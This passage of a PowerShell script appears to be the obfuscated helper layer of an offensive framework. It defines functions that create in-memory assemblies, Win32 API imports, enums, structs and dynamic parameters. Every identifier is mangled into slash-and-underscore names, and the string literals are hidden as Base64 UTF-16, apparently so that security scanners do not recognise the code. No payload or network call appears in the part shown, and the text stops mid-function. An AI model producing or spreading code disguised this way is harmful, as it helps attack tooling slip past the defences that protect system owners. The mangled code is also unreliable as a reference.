
function ___/==\_/==\_/\_/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${_/===\____/=\/\___} = [Guid]::NewGuid().ToString()
    )
    ${__/\___/\_/=\/==\} = [Reflection.Assembly].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBBAHAAcABEAG8AbQBhAGkAbgA=')))).GetProperty($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgA=')))).GetValue($null, @())
    ${____/==\/==\___/=} = ${__/\___/\_/=\/==\}.GetAssemblies()
    foreach (${__/\_/\_/\/===\__} in ${____/==\/==\___/=}) {
        if (${__/\_/\_/\/===\__}.FullName -and (${__/\_/\_/\/===\__}.FullName.Split(',')[0] -eq ${_/===\____/=\/\___})) {
            return ${__/\_/\_/\/===\__}
        }
    }
    ${/===\/\_/\_/\/==\} = New-Object Reflection.AssemblyName(${_/===\____/=\/\___})
    $Domain = ${__/\___/\_/=\/==\}
    ${__/\/\/====\_/\__} = $Domain.DefineDynamicAssembly(${/===\/\_/\_/\/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    ${____/=\/\/=\_/=\/} = ${__/\/\/====\_/\__}.DefineDynamicModule(${_/===\____/=\/\___}, $False)
    return ${____/=\/\/=\_/=\/}
}
function _____/=\/=\___/\/= {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        ${__/=\/\/==\/===\_/},
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        ${____/\______/==\/=},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${_/=\___/\_____/=\/},
        [Parameter(Position = 3)]
        [Type[]]
        ${____/\/\__/\_/\_/=},
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${__/=\_/\___/\/=\/\},
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${___/\____/==\_/===},
        [String]
        ${_/===\/=\____/\/\/},
        [Switch]
        ${__/\___/\__/\_/=\/}
    )
    $Properties = @{
        DllName = ${__/=\/\/==\/===\_/}
        FunctionName = ${____/\______/==\/=}
        ReturnType = ${_/=\___/\_____/=\/}
    }
    if (${____/\/\__/\_/\_/=}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = ${____/\/\__/\_/\_/=} }
    if (${__/=\_/\___/\/=\/\}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = ${__/=\_/\___/\/=\/\} }
    if (${___/\____/==\_/===}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = ${___/\____/==\_/===} }
    if (${__/\___/\__/\_/=\/}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = ${__/\___/\__/\_/=\/} }
    if (${_/===\/=\____/\/\/}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))] = ${_/===\/=\____/\/\/} }
    New-Object PSObject -Property $Properties
}
function __/====\_/\_/\_/\/
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${__/=\/\/==\/===\_/},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${____/\______/==\/=},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        ${_/===\/=\____/\/\/},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        ${_/=\___/\_____/=\/},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        ${____/\/\__/\_/\_/=},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        ${__/=\_/\___/\/=\/\} = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        ${___/\____/==\_/===} = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        ${__/\___/\__/\_/=\/},
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_/====\_/=\_/=\/\_},
        [ValidateNotNull()]
        [String]
        ${_/=======\_/=\__/=} = ''
    )
    BEGIN
    {
        ${/====\/\_/=\_____} = @{}
    }
    PROCESS
    {
        if (${_/====\_/=\_/=\/\_} -is [Reflection.Assembly])
        {
            if (${_/=======\_/=\__/=})
            {
                ${/====\/\_/=\_____}[${__/=\/\/==\/===\_/}] = ${_/====\_/=\_/=\/\_}.GetType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0APQA9AD0APQA9AFwAXwAvAD0AXABfAF8ALwA9AH0ALgAkAHsAXwBfAC8APQBcAC8AXAAvAD0APQBcAC8APQA9AD0AXABfAC8AfQA='))))
            }
            else
            {
                ${/====\/\_/=\_____}[${__/=\/\/==\/===\_/}] = ${_/====\_/=\_/=\/\_}.GetType(${__/=\/\/==\/===\_/})
            }
        }
        else
        {
            if (!${/====\/\_/=\_____}.ContainsKey(${__/=\/\/==\/===\_/}))
            {
                if (${_/=======\_/=\__/=})
                {
                    ${/====\/\_/=\_____}[${__/=\/\/==\/===\_/}] = ${_/====\_/=\_/=\/\_}.DefineType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0APQA9AD0APQA9AFwAXwAvAD0AXABfAF8ALwA9AH0ALgAkAHsAXwBfAC8APQBcAC8AXAAvAD0APQBcAC8APQA9AD0AXABfAC8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    ${/====\/\_/=\_____}[${__/=\/\/==\/===\_/}] = ${_/====\_/=\_/=\/\_}.DefineType(${__/=\/\/==\/===\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            $Method = ${/====\/\_/=\_____}[${__/=\/\/==\/===\_/}].DefineMethod(
                ${____/\______/==\/=},
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                ${_/=\___/\_____/=\/},
                ${____/\/\__/\_/\_/=})
            ${_/\/\__/=\/==\/\_} = 1
            foreach(${___/\/\_/\/\/\___} in ${____/\/\__/\_/\_/=})
            {
                if (${___/\/\_/\/\/\___}.IsByRef)
                {
                    [void] $Method.DefineParameter(${_/\/\__/=\/==\/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $null)
                }
                ${_/\/\__/=\/==\/\_}++
            }
            ${/=\/==\/=\/==\_/=} = [Runtime.InteropServices.DllImportAttribute]
            ${/==\/\__/\_/=\/\_} = ${/=\/==\/=\/==\_/=}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            ${_/\__/==\______/=} = ${/=\/==\/=\/==\_/=}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            ${__/\_/==\/==\_/\/} = ${/=\/==\/=\/==\_/=}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            ${_/\/=====\__/\_/\} = ${/=\/==\/=\/==\_/=}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA='))))
            if (${__/\___/\__/\_/=\/}) { ${_/=\_/=======\/\_} = $True } else { ${_/=\_/=======\/\_} = $False }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))]) { ${/==\__/\/=\_/\__/} = ${_/===\/=\____/\/\/} } else { ${/==\__/\/=\_/\__/} = ${____/\______/==\/=} }
            ${_/\_/===\_/\_/=\_} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${/=\/=\/===\_/\/\_} = New-Object Reflection.Emit.CustomAttributeBuilder(${_/\_/===\_/\_/=\_},
                ${__/=\/\/==\/===\_/}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${/==\/\__/\_/=\/\_},
                                           ${_/\__/==\______/=},
                                           ${__/\_/==\/==\_/\/},
                                           ${_/\/=====\__/\_/\}),
                [Object[]] @(${_/=\_/=======\/\_},
                             ([Runtime.InteropServices.CallingConvention] ${__/=\_/\___/\/=\/\}),
                             ([Runtime.InteropServices.CharSet] ${___/\____/==\_/===}),
                             ${/==\__/\/=\_/\__/}))
            $Method.SetCustomAttribute(${/=\/=\/===\_/\/\_})
        }
    }
    END
    {
        if (${_/====\_/=\_/=\/\_} -is [Reflection.Assembly])
        {
            return ${/====\/\_/=\_____}
        }
        ${_/=\____/\/=\/\/\} = @{}
        foreach (${_/===\____/\_/\_/} in ${/====\/\_/=\_____}.Keys)
        {
            ${__/==\/\/=\__/=\__} = ${/====\/\_/=\_____}[${_/===\____/\_/\_/}].CreateType()
            ${_/=\____/\/=\/\/\}[${_/===\____/\_/\_/}] = ${__/==\/\/=\__/=\__}
        }
        return ${_/=\____/\/=\/\/\}
    }
}
function __/\_/\/=\_/\/=\/\ {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_/====\_/=\_/=\/\_},
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${__/=\__/=\/=\___/=},
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        ${__/==\/\/=\__/=\__},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${__/\/\/=\_/=\/====},
        [Switch]
        ${_/=\/\/\/=\/\___/\}
    )
    if (${_/====\_/=\_/=\/\_} -is [Reflection.Assembly])
    {
        return (${_/====\_/=\_/=\/\_}.GetType(${__/=\__/=\/=\___/=}))
    }
    ${__/===\_/==\/\/\/} = ${__/==\/\/=\__/=\__} -as [Type]
    ${/\_____/\/\___/==} = ${_/====\_/=\_/=\/\_}.DefineEnum(${__/=\__/=\/=\___/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), ${__/===\_/==\/\/\/})
    if (${_/=\/\/\/=\/\___/\})
    {
        ${/=\__/\/\___/\/==} = [FlagsAttribute].GetConstructor(@())
        ${_/\_/\_/=\__/=\_/} = New-Object Reflection.Emit.CustomAttributeBuilder(${/=\__/\/\___/\/==}, @())
        ${/\_____/\/\___/==}.SetCustomAttribute(${_/\_/\_/=\__/=\_/})
    }
    foreach (${_/===\____/\_/\_/} in ${__/\/\/=\_/=\/====}.Keys)
    {
        $null = ${/\_____/\/\___/==}.DefineLiteral(${_/===\____/\_/\_/}, ${__/\/\/=\_/=\/====}[${_/===\____/\_/\_/}] -as ${__/===\_/==\/\/\/})
    }
    ${/\_____/\/\___/==}.CreateType()
}
function _____/===\_/=\/\_/ {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        ${__/=\/===\_/\_/\/=},
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        ${__/==\/\/=\__/=\__},
        [Parameter(Position = 2)]
        [UInt16]
        ${_/=\/\_/\/=\_____/},
        [Object[]]
        ${__/\/=\__/\_/\/==\}
    )
    @{
        Position = ${__/=\/===\_/\_/\/=}
        Type = ${__/==\/\/=\__/=\__} -as [Type]
        Offset = ${_/=\/\_/\/=\_____/}
        MarshalAs = ${__/\/=\__/\_/\/==\}
    }
}
function ____/\__/\/=\___/\
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_/====\_/=\_/=\/\_},
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${__/=\__/=\/=\___/=},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${_/=\/=\___/=\/\___},
        [Reflection.Emit.PackingSize]
        ${____/\/=\/\/===\/\} = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        ${__/\/===\/=\____/\}
    )
    if (${_/====\_/=\_/=\/\_} -is [Reflection.Assembly])
    {
        return (${_/====\_/=\_/=\/\_}.GetType(${__/=\__/=\/=\___/=}))
    }
    [Reflection.TypeAttributes] ${__/=\/==\__/=\_/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAANAAoAIAAgACAAIAAgACAAIAAgAEMAbABhAHMAcwAsAA0ACgAgACAAIAAgACAAIAAgACAAUAB1AGIAbABpAGMALAANAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    if (${__/\/===\/=\____/\})
    {
        ${__/=\/==\__/=\_/\} = ${__/=\/==\__/=\_/\} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${__/=\/==\__/=\_/\} = ${__/=\/==\__/=\_/\} -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    ${/==\__/=\_/=\/\__} = ${_/====\_/=\_/=\/\_}.DefineType(${__/=\__/=\/=\___/=}, ${__/=\/==\__/=\_/\}, [ValueType], ${____/\/=\/\/===\/\})
    ${_/==\/\_____/\/=\} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${/=\/\______/\__/\} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    ${_/=\/=======\/==\} = New-Object Hashtable[](${_/=\/=\___/=\/\___}.Count)
    foreach (${____/=\/\_/\/==\/} in ${_/=\/=\___/=\/\___}.Keys)
    {
        ${__/===\___/=\/\_/} = ${_/=\/=\___/=\/\___}[${____/=\/\_/\/==\/}][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        ${_/=\/=======\/==\}[${__/===\___/=\/\_/}] = @{FieldName = ${____/=\/\_/\/==\/}; Properties = ${_/=\/=\___/=\/\___}[${____/=\/\_/\/==\/}]}
    }
    foreach (${____/=\/\_/\/==\/} in ${_/=\/=======\/==\})
    {
        ${_/\/=\_/\/======\} = ${____/=\/\_/\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        ${/=\/\/=\/\___/\/=} = ${____/=\/\_/\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        ${_/=\/\_/\/=\_____/} = ${/=\/\/=\/\___/\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        ${__/==\/\/=\__/=\__} = ${/=\/\/=\/\___/\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        ${__/\/=\__/\_/\/==\} = ${/=\/\/=\/\___/\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        ${/==\_/\/\__/===\/} = ${/==\__/=\_/=\/\__}.DefineField(${_/\/=\_/\/======\}, ${__/==\/\/=\__/=\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if (${__/\/=\__/\_/\/==\})
        {
            ${___/\__/===\/\__/} = ${__/\/=\__/\_/\/==\}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${__/\/=\__/\_/\/==\}[1])
            {
                ${_/\_____/=\/\____} = ${__/\/=\__/\_/\/==\}[1]
                ${___/\/\___/=\/\_/} = New-Object Reflection.Emit.CustomAttributeBuilder(${_/==\/\_____/\/=\},
                    ${___/\__/===\/\__/}, ${/=\/\______/\__/\}, @(${_/\_____/=\/\____}))
            }
            else
            {
                ${___/\/\___/=\/\_/} = New-Object Reflection.Emit.CustomAttributeBuilder(${_/==\/\_____/\/=\}, [Object[]] @(${___/\__/===\/\__/}))
            }
            ${/==\_/\/\__/===\/}.SetCustomAttribute(${___/\/\___/=\/\_/})
        }
        if (${__/\/===\/=\____/\}) { ${/==\_/\/\__/===\/}.SetOffset(${_/=\/\_/\/=\_____/}) }
    }
    ${__/=\__/\/=====\/} = ${/==\__/=\_/=\/\__}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    ${_/=\/\/=====\/\_/} = ${__/=\__/\/=====\/}.GetILGenerator()
    ${_/=\/\/=====\/\_/}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${/==\__/=\_/=\/\__})
    ${_/=\/\/=====\/\_/}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${_/=\/\/=====\/\_/}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    ${_/=\/\/=====\/\_/}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${/===\__/=\/=\__/\} = ${/==\__/=\_/=\/\__}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        ${/==\__/=\_/=\/\__},
        [Type[]] @([IntPtr]))
    ${/==\__/\__/===\/=} = ${/===\__/=\/=\__/\}.GetILGenerator()
    ${/==\__/\__/===\/=}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${/==\__/\__/===\/=}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${/==\__/\__/===\/=}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${/==\__/=\_/=\/\__})
    ${/==\__/\__/===\/=}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${/==\__/\__/===\/=}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    ${/==\__/\__/===\/=}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${/==\__/=\_/=\/\__})
    ${/==\__/\__/===\/=}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${/==\__/=\_/=\/\__}.CreateType()
}
Function _/===\_/\/\/\/==\_ {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]${__/==\/\/=\__/=\__} = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]${/===\/=\/=====\__},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]${__/=\/===\_/\_/\/=},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQAgAG0AdQBzAHQAIABiAGUAIABhACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFIAdQBuAHQAaQBtAGUARABlAGYAaQBuAGUAZABQAGEAcgBhAG0AZQB0AGUAcgBEAGkAYwB0AGkAbwBuAGEAcgB5ACAAbwBiAGoAZQBjAHQA')))
            }
            $true
        })]
        $Dictionary = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAIABtAHUAcwB0ACAAYgBlACAAYQAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMARABpAGMAdABpAG8AbgBhAHIAeQAgAG8AYgBqAGUAYwB0AA==')))
            }
            $true
        })]
        $BoundParameters
    )
    Begin {
        ${__/==\___/=\/==\/} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        ${_/=\_/====\/=\_/\} = (gcm _temp).Parameters.Keys
    }
    Process {
        if($CreateVariables) {
            ${/==\/=\/=\____/==} = $BoundParameters.Keys | ? { ${_/=\_/====\/=\_/\} -notcontains $_ }
            ForEach(${___/\/\_/\/\/\___} in ${/==\/=\/=\____/==}) {
                if (${___/\/\_/\/\/\___}) {
                    sv -Name ${___/\/\_/\/\/\___} -Value $BoundParameters.${___/\/\_/\/\/\___} -Scope 1 -Force
                }
            }
        }
        else {
            ${_/===\_____/=\/\/} = @()
            ${_/===\_____/=\/\/} = $PSBoundParameters.GetEnumerator() |
                        % {
                            if($_.Value.PSobject.Methods.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBFAHEAdQBhAGwAcwAkAA==')))) {
                                if(!$_.Value.Equals((gv -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (gv -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if(${_/===\_____/=\/\/}) {
                ${_/===\_____/=\/\/} | % {[void]$PSBoundParameters.Remove($_)}
            }
            ${/=========\/=\/=\} = (gcm -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        ? { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            select -ExpandProperty Key |
                                                ? { $PSBoundParameters.Keys -notcontains $_ }
            ${/==\_/=\/\___/===} = $null
            ForEach (${___/\/\_/\/\/\___} in ${/=========\/=\/=\}) {
                ${___/\_/\/\_/\/==\} = gv -Name ${___/\/\_/\/\/\___} -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue(${___/\/\_/\/\/\___}, [ref]${/==\_/=\/\___/===}) -and ${___/\_/\/\_/\/==\}) {
                    $PSBoundParameters.${___/\/\_/\/\/\___} = ${___/\_/\/\_/\/==\}
                }
            }
            if($Dictionary) {
                ${__/\/\_/\/===\_/\} = $Dictionary
            }
            else {
                ${__/\/\_/\/===\_/\} = ${__/==\___/=\/==\/}
            }
            ${__/=\_/=\___/\__/} = {gv -Name $_ -ValueOnly -Scope 0}
            ${/=\/\_/\/\__/\_/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAE0AYQBuAGQAYQB0AG8AcgB5AHwAUABvAHMAaQB0AGkAbwBuAHwAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQB8AEQAbwBuAHQAUwBoAG8AdwB8AEgAZQBsAHAATQBlAHMAcwBhAGcAZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAHIAdAB5AE4AYQBtAGUAfABWAGEAbAB1AGUARgByAG8AbQBSAGUAbQBhAGkAbgBpAG4AZwBBAHIAZwB1AG0AZQBuAHQAcwApACQA')))
